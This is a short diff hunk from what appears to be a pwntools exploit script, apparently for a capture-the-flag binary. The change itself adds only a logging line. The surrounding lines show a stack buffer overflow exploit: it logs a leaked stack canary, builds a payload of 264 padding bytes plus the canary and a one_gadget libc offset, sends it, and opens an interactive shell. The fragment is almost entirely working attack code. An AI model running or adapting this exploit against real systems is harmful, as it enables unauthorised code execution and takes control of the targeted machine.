@@ -14,6 +14,7 @@ log.info("Leak: "+ hex(Leak))
 log.info("Canary: "+ hex(Canary))
 #gdb.attach(proc)
 #libc.address = Leak - libc.sym['_IO_2_1_stdin_']
+log.info("Libc address: "+ hex(libc.address))
 payload = b"X"*264+p64(Canary)+p64(0)+p64(libc.address + 0xe6c81)
 proc.sendline(payload)
 proc.interactive()
